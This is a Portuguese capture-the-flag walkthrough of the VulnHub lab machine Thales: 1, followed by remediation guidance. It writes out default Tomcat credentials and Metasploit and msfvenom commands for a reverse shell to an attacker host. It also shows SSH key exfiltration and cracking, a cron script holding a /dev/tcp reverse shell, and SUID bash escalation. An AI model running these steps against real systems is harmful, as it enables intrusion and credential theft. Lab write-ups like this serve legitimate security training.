# Thales: 1 — O Servidor do Filósofo Antigo Tinha Credenciais Fracas

Tales de Mileto, o filósofo grego antigo, é creditado com a ideia de que a água é a substância fundamental de todas as coisas. Thales: 1, a máquina VulnHub, ensina uma verdade fundamental diferente: credenciais padrão, chaves privadas legíveis pelo mundo, e scripts cron graváveis pelo mundo são a substância fundamental da maioria das escalações de privilégios no Linux. Esta máquina de nível iniciante encadeia quatro configurações incorretas clássicas: Tomcat Manager com credenciais padrão fracas (tomcat:role1), uma chave SSH criptografada legível pelo mundo crackeada com john (vodka06), e um script cron root gravável pelo mundo que define o bit SUID no bash. Arrasou, mano! Muito obrigado ao criador por uma máquina limpa e didática.

| Campo | Valor |
|---|---|
| **Nível** | Fácil |
| **VM Alvo** | Thales: 1 (Ubuntu 18.04.5 LTS, hostname: miletus) |
| **VM Atacante** | Kali Linux |
| **URL VulnHub** | https://www.vulnhub.com/entry/thales-1,749/ |
| **Técnicas** | Enumeração de serviços Nmap, brute-force de credencial Apache Tomcat Manager, upload de arquivo WAR via Metasploit RCE, exfiltração de chave privada SSH, ssh2john + John the Ripper para cracking de passphrase, injeção em script cron gravável pelo mundo, escalação de privilégios via SUID bash |
| **CVEs** | CWE-521 (Requisitos de Senha Fracos: credenciais padrão Tomcat tomcat:role1), CWE-732 (Atribuição Incorreta de Permissão: backup.sh gravável pelo mundo executado por root cron), CWE-312 (Armazenamento em Texto Claro: chave privada SSH criptografada legível pelo mundo) |
| **Grupos APT** | APT41: ativamente visa interfaces Apache Tomcat Manager expostas com credenciais padrão para acesso inicial em ambientes corporativos; FIN7: usa implantação de WAR no Tomcat Manager para instalação persistente de web shell |

---

## Resumo do Ataque

```
netdiscover → 192.168.56.102 (miletus)
    |
    v
nmap → porta 22 (SSH), porta 8080 (Apache Tomcat 9.0.52)
    |
    v
curl -u "tomcat:role1" http://192.168.56.102:8080/manager/html → 200 OK
    |
    v
MSF: exploit/multi/http/tomcat_mgr_upload → Meterpreter (usuário tomcat)
    |
    v
ls /home/thales/.ssh/ → id_rsa (legível pelo mundo) → cat id_rsa → exfiltrar
    |
    v
cat /home/thales/user.txt → a837c0b5d2a8a07225fd9905f5a0e9c4 (flag de usuário)
    |
    v
ssh2john thales_id_rsa > hash → john --wordlist=rockyou.txt hash → vodka06
    |
    v
ssh -i thales_id_rsa thales@192.168.56.102 (passphrase: vodka06)
    |
    v
cat notes.txt → /usr/local/bin/backup.sh
    |
    v
ls -la /usr/local/bin/backup.sh → -rwxrwxrwx root root (gravável pelo mundo!)
    |
    v
cat backup.sh → já contém: chmod 4777 /bin/bash
    |
    v
aguardar cron root disparar → ls -la /bin/bash → -rwsrwxrwx
    |
    v
/bin/bash -p → euid=0(root)
    |
    v
cat /root/root.txt → 3a1c85bebf8833b0ecafe900fb8598b17 (flag de root)
```

---

## Metodologia

1. Descoberta de host para identificar o alvo na rede
2. Scan de portas com detecção de versão de serviço
3. Identificar Apache Tomcat Manager e testar credenciais padrão
4. Explorar Tomcat Manager com upload WAR Metasploit
5. Enumerar diretórios home para arquivos sensíveis
6. Exfiltrar chave privada SSH legível pelo mundo
7. Capturar flag de usuário
8. Crackear passphrase da chave SSH com John the Ripper
9. SSH para o alvo como usuário thales
10. Descobrir e explorar script cron root gravável pelo mundo
11. Aguardar bash SUID, escalar para root, capturar flag de root

---

## Passo 1 — Descoberta de Host

```bash
netdiscover -r 192.168.56.0/24
# ou
arp-scan --localnet
```

```
192.168.56.102  08:00:27:xx:xx:xx  PCS Systemtechnik GmbH (VirtualBox)
```

IP alvo: `192.168.56.102`, hostname: `miletus` (revelado depois).

```bash
export TARGET=192.168.56.102
```

**MITRE ATT&CK:** T1046 — Descoberta de Serviços de Rede

---

## Passo 2 — Scan de Portas e Enumeração de Serviços

```bash
nmap -sV -sC -p- $TARGET
```

```
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.5
8080/tcp open  http    Apache Tomcat 9.0.52
```

Apenas duas portas: SSH e Tomcat. A página do Tomcat Manager (`/manager/html`) é imediatamente interessante. Tomcat 9.0.52 significa que verificamos CVEs conhecidos e, mais importante, testamos credenciais padrão.

```bash
curl -s http://$TARGET:8080/manager/html -o /dev/null -w "%{http_code}\n"
# 401 — Não Autorizado, mas a interface existe
```

**Nota do mundo real:** Instalações do Apache Tomcat com credenciais padrão são extremamente comuns. APT41 documentado usando credenciais padrão do Tomcat para ponto de entrada inicial em ambientes corporativos. A interface do Manager permite implantar arquivos WAR, tornando-a um caminho direto para execução de código. Caramba!

**MITRE ATT&CK:** T1046 — Descoberta de Serviços de Rede

---

## Passo 3 — Teste de Credenciais do Tomcat Manager

Teste os pares de credenciais padrão mais comuns do Tomcat:

```bash
curl -u "tomcat:role1" http://$TARGET:8080/manager/html -o /dev/null -w "%{http_code}\n"
# 200
```

**Credenciais confirmadas: `tomcat:role1`**

Você também pode enumerar com Metasploit:

```bash
msfconsole -q
use auxiliary/scanner/http/tomcat_mgr_login
set RHOSTS $TARGET
set RPORT 8080
run
# [+] 192.168.56.102:8080 - Login Successful: tomcat:role1
```

**MITRE ATT&CK:** T1110.001 — Força Bruta: Adivinhação de Senha; T1078.001 — Contas Válidas: Contas Padrão

---

## Passo 4 — Upload de Arquivo WAR RCE via Metasploit

A interface do Tomcat Manager `/manager/html` permite fazer upload e implantar arquivos WAR. Um WAR contendo uma shell reversa JSP entrega execução de código:

```bash
msfconsole -q
use exploit/multi/http/tomcat_mgr_upload
set RHOSTS $TARGET
set RPORT 8080
set HttpUsername tomcat
set HttpPassword role1
set PAYLOAD java/meterpreter/reverse_tcp
set LHOST 192.168.56.101
set LPORT 4449
run
```

```
[*] Meterpreter session 1 opened

meterpreter > getuid
Server username: tomcat
```

**Alternativa manual:** Use `msfvenom` para criar o arquivo WAR e fazer upload via interface web do Manager:

```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.56.101 LPORT=4449 -f war -o shell.war
# Upload via http://ALVO:8080/manager/html → Deploy → WAR file to deploy
```

**MITRE ATT&CK:** T1190 — Exploração de Aplicação Pública; T1505.003 — Componente de Software do Servidor: Web Shell

---

## Passo 5 — Enumerar Diretórios Home e Exfiltrar Chave SSH

Da sessão Meterpreter:

```bash
meterpreter > shell
$ id
uid=999(tomcat) gid=999(tomcat) groups=999(tomcat)

$ ls -la /home/thales/
drwx------ 2 thales thales 4096 .ssh/
-rw-r--r-- 1 thales thales   33 user.txt
-rw-r--r-- 1 thales thales  117 notes.txt

$ cat /home/thales/user.txt
a837c0b5d2a8a07225fd9905f5a0e9c4
```

**Flag de usuário capturada:** `a837c0b5d2a8a07225fd9905f5a0e9c4`

Verifique o diretório SSH:

```bash
$ ls -la /home/thales/.ssh/
-rw-r--r-- 1 thales thales 1876 id_rsa
```

A chave privada é **legível pelo mundo** (`-rw-r--r--`). Isso é uma configuração crítica incorreta: chaves privadas SSH devem ser modo 600 (apenas leitura/escrita do proprietário). Exfiltre a chave:

```bash
$ cat /home/thales/.ssh/id_rsa
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
[corpo da chave]
-----END RSA PRIVATE KEY-----
```

Copie a chave completa para a máquina atacante e salve como `thales_id_rsa`.

**Nota do mundo real:** Chaves privadas SSH legíveis pelo mundo são um achado real em ambientes de produção. Qualquer conta de serviço com acesso ao sistema de arquivos (servidor web, banco de dados, agente de backup) pode ler e exfiltrar a chave. CWE-312: material de chave privada deve sempre ser protegido com permissões estritas.

**MITRE ATT&CK:** T1552.004 — Credenciais Não Seguras: Chaves Privadas

---

## Passo 6 — Crackear Passphrase da Chave SSH com John the Ripper

```bash
# Converter para formato crackeável pelo John
python3 /usr/share/john/ssh2john.py thales_id_rsa > thales_hash

# Crackear com rockyou.txt
john --wordlist=/usr/share/wordlists/rockyou.txt thales_hash
```

```
vodka06          (thales_id_rsa)
1g 0:00:00:01 DONE
```

**Passphrase da chave:** `vodka06`

**MITRE ATT&CK:** T1110.002 — Força Bruta: Cracking de Senha

---

## Passo 7 — Login SSH como thales

```bash
chmod 600 thales_id_rsa
ssh -i thales_id_rsa thales@$TARGET
# Insira a passphrase: vodka06
```

```
thales@miletus:~$ id
uid=1000(thales) gid=1000(thales) groups=1000(thales)
```

Leia a dica:

```bash
thales@miletus:~$ cat notes.txt
I prepared a backup script for you.
The script is in /usr/local/bin/backup.sh
```

**MITRE ATT&CK:** T1021.004 — Serviços Remotos: SSH

---

## Passo 8 — Inspecionar o Script de Backup

```bash
thales@miletus:~$ ls -la /usr/local/bin/backup.sh
-rwxrwxrwx 1 root root 72 Aug 10  2021 /usr/local/bin/backup.sh

thales@miletus:~$ cat /usr/local/bin/backup.sh
#!/bin/bash
chmod 4777 /bin/bash
/bin/bash -i >& /dev/tcp/IP/6667 0>&1
```

Observações principais:
- Proprietário: root
- Permissões: **gravável pelo mundo** (`-rwxrwxrwx`)
- O script **já contém** `chmod 4777 /bin/bash` — ele define o bit SUID no bash
- Um cron root executa este script

O cron já está configurado para executar backup.sh como root, e backup.sh já contém o payload `chmod 4777 /bin/bash`. Nenhuma modificação necessária. Só aguardar. Sensacional!

**Nota do mundo real:** Scripts privilegiados graváveis pelo mundo são o vetor de escalação de privilégios Linux mais confiável e direto. Em ambientes de produção, esse padrão aparece quando scripts são inicialmente criados com permissões excessivamente permissivas por conveniência e nunca adequadamente ajustados. Todo script cron deve ser auditado para permissões de escrita.

**MITRE ATT&CK:** T1053.003 — Tarefa Agendada: Cron

---

## Passo 9 — Aguardar Cron e Escalar para Root

Aguarde o cron disparar (normalmente dentro de 1 minuto). Monitore o binário bash:

```bash
thales@miletus:~$ watch -n 5 ls -la /bin/bash
```

Quando o bit SUID é definido:

```bash
thales@miletus:~$ ls -la /bin/bash
-rwsrwxrwx 1 root root 1113504 Jun  6  2019 /bin/bash
```

O `s` na posição execute do proprietário confirma que o SUID está definido. Escale:

```bash
thales@miletus:~$ /bin/bash -p
bash-4.4# id
uid=1000(thales) gid=1000(thales) euid=0(root) groups=1000(thales)

bash-4.4# cat /root/root.txt
3a1c85bebf8833b0ecafe900fb8598b17
```

A flag `-p` preserva o UID efetivo (EUID), rodando bash com `euid=0` enquanto mantém o UID original. Esta é a técnica de exploração SUID pretendida.

(☞ﾟヮﾟ)☞ Root. Limpo, clássico, efetivo. Top demais!

**MITRE ATT&CK:** T1548.001 — Abuso do Mecanismo de Controle de Elevação: SUID; T1053.003 — Tarefa Agendada: Cron

---

## Flags, Hashes e Credenciais Capturados

| Tipo | Valor | Encontrado em | Técnica |
|---|---|---|---|
| Credencial | tomcat:role1 | Brute-force Tomcat Manager | Teste de credencial padrão |
| Flag de usuário | `a837c0b5d2a8a07225fd9905f5a0e9c4` | /home/thales/user.txt | Enumeração de sistema de arquivos |
| Passphrase chave SSH | vodka06 | John the Ripper + rockyou.txt | Cracking de passphrase |
| Flag de root | `3a1c85bebf8833b0ecafe900fb8598b17` | /root/root.txt | SUID bash -p |

---

## Lições Aprendidas

| # | Achado | Relevância no Mundo Real | Lição Principal |
|---|---|---|---|
| 1 | Tomcat Manager com credenciais padrão (tomcat:role1) | APT41 documentado usando credenciais padrão Tomcat para acesso inicial; CISA avisa sobre credenciais padrão em serviços voltados para internet | Mude credenciais padrão imediatamente; restrinja o Manager apenas para localhost ou IPs confiáveis |
| 2 | Chave privada SSH legível pelo mundo em /home/thales/.ssh/ | Qualquer usuário de serviço (tomcat, www-data, mysql) pode ler e exfiltrar a chave | Defina permissões da chave privada SSH para 600: `chmod 600 ~/.ssh/id_rsa` |
| 3 | Passphrase da chave SSH crackeável com rockyou (vodka06) | Passphrases fracas derrotam o propósito da criptografia | Use passphrases fortes e aleatórias para chaves SSH; considere tokens de hardware |
| 4 | Script cron root gravável pelo mundo | Cron + script gravável pelo mundo = root garantido; achado de texto de livro didático CTF e mundo real | Audite todos os scripts cron: permissões devem ser 700 ou 750, propriedade do root |
| 5 | SUID bash fornece euid=0 com /bin/bash -p | Uma vez que bash tem SUID definido, qualquer usuário local se torna root efetivo | Monitore mudanças SUID; FIM em binários do sistema |

---

## Mapeamento MITRE ATT&CK

| Fase | Tática | Técnica | ID TTP |
|---|---|---|---|
| Reconhecimento | Descoberta | Descoberta de Serviços de Rede | T1046 |
| Acesso Inicial | Acesso Inicial | Exploração de Aplicação Pública | T1190 |
| Acesso a Credenciais | Acesso a Credenciais | Contas Válidas: Contas Padrão | T1078.001 |
| Acesso a Credenciais | Acesso a Credenciais | Força Bruta: Adivinhação de Senha | T1110.001 |
| Execução | Execução | Componente de Software do Servidor: Web Shell (WAR) | T1505.003 |
| Acesso a Credenciais | Acesso a Credenciais | Credenciais Não Seguras: Chaves Privadas | T1552.004 |
| Acesso a Credenciais | Acesso a Credenciais | Força Bruta: Cracking de Senha | T1110.002 |
| Movimentação Lateral | Movimentação Lateral | Serviços Remotos: SSH | T1021.004 |
| Persistência | Persistência | Tarefa Agendada: Cron | T1053.003 |
| Escalação de Privilégios | Escalação de Privilégios | Abuso do Mecanismo de Controle de Elevação: SUID | T1548.001 |

---

## Remediação e Contenção

### Correções Técnicas

1. **Mude credenciais padrão do Tomcat:** senha forte única para todas as contas Tomcat; restrinja o Manager para 127.0.0.1
2. **Corrija permissões da chave SSH:** `chmod 600 /home/thales/.ssh/id_rsa` — apenas o proprietário deve ler chaves privadas
3. **Corrija permissões do script cron:** `chown root:root /usr/local/bin/backup.sh && chmod 700 /usr/local/bin/backup.sh`
4. **Remova SUID do bash:** `chmod 0755 /bin/bash`; audite com `find / -perm -4000 -type f 2>/dev/null`
5. **Atualize o Tomcat:** atualize da versão 9.0.52 para a versão atual corrigida
6. **Implemente monitoramento de integridade de arquivo:** monitore `/usr/local/bin/` e binários SUID para mudanças

### NIST CSF 2.0

| Função | Categoria | Ação |
|---|---|---|
| Identificar | Gerenciamento de Ativos | Inventarie todas as instâncias Tomcat; documente todos os trabalhos cron e seus proprietários |
| Proteger | Controle de Acesso | Credenciais padrão substituídas; permissões de chave SSH aplicadas; permissões de script cron corrigidas |
| Proteger | Segurança de Dados | Chaves privadas acessíveis apenas pelo proprietário; sem material de chave legível pelo mundo |
| Detectar | Anomalias e Eventos | Alertar sobre mudanças SUID; novos deployments WAR no Tomcat; arquivos graváveis pelo mundo em /usr/local/bin |
| Responder | Planejamento de Resposta | Remova shell WAR; rotacione credenciais tomcat; corrija permissões; corrija Tomcat |

### NIST SP 800-53 Rev. 5

| Controle | Descrição | Aplicação |
|---|---|---|
| AC-3 | Aplicação de Acesso | Restrinja o Tomcat Manager ao localhost; permissões de chave SSH |
| AC-6 | Menor Privilégio | Usuário tomcat não deve ler diretórios home de outros usuários |
| IA-2 | Identificação e Autenticação | Sem credenciais padrão em produção; senhas fortes obrigatórias |
| CM-7 | Menor Funcionalidade | Restrinja o Tomcat Manager a redes confiáveis; desative se não utilizado |
| SC-28 | Proteção de Informações em Repouso | Chaves privadas SSH devem ser modo 600 |
| SI-7 | Integridade de Software, Firmware e Informação | FIM em /usr/local/bin/; monitoramento de binário SUID |

### CISA KEV

Vulnerabilidades do Apache Tomcat e exploração do Tomcat Manager via credenciais padrão são referenciados em múltiplos Alertas CISA (AA21-008A, AA22-074A). Credenciais padrão em interfaces de gerenciamento web são especificamente apontadas como uma técnica de acesso inicial principal usada por grupos de ransomware e atores APT. Mude todas as credenciais padrão imediatamente conforme orientação da CISA.

### C2M2

| Domínio | Prática | MIL Alvo |
|---|---|---|
| Gerenciamento de Identidade e Acesso (IAM) | Gerenciar Privilégios e Contas | MIL3 |
| Gerenciamento de Ameaças e Vulnerabilidades (THREAT) | Realizar Avaliações de Vulnerabilidade | MIL2 |
| Gerenciamento de Ativos, Mudanças e Configuração (ASSET) | Gerenciar Inventário de Ativos de TI | MIL2 |

### MITRE D3FEND

- **D3-ACH** — Fortalecimento de Configuração de Aplicação (mude credenciais padrão Tomcat; restrinja o Manager)
- **D3-OAM** — Gerenciamento Administrativo do SO (corrija permissões cron; corrija permissões de chave SSH)
- **D3-FH** — Hashing de Arquivo (FIM em /usr/local/bin/; monitore mudanças SUID)
- **D3-HBPI** — Fortalecer Integridade do Pipeline de Build (sem credenciais padrão em servidores de aplicação deployados)

---

## Considerações Finais

Mano, Thales: 1 é uma máquina iniciante perfeita. Ela ensina quatro achados do mundo real que aparecem em todo relatório de pentest Linux: credenciais padrão do Tomcat, chaves SSH legíveis pelo mundo, cracking de senha com John, e scripts cron graváveis pelo mundo. A cadeia é limpa e lógica: cada passo leva naturalmente para o próximo. Se você completar esta máquina, você tem a fundação para entender escalação de privilégios Linux real. O filósofo Tales disse "Conhece a ti mesmo." Depois desta máquina: conheça as permissões do seu trabalho cron. Top demais, rapaziada!

Thanks guys!! (❍ᴥ❍ʋ)
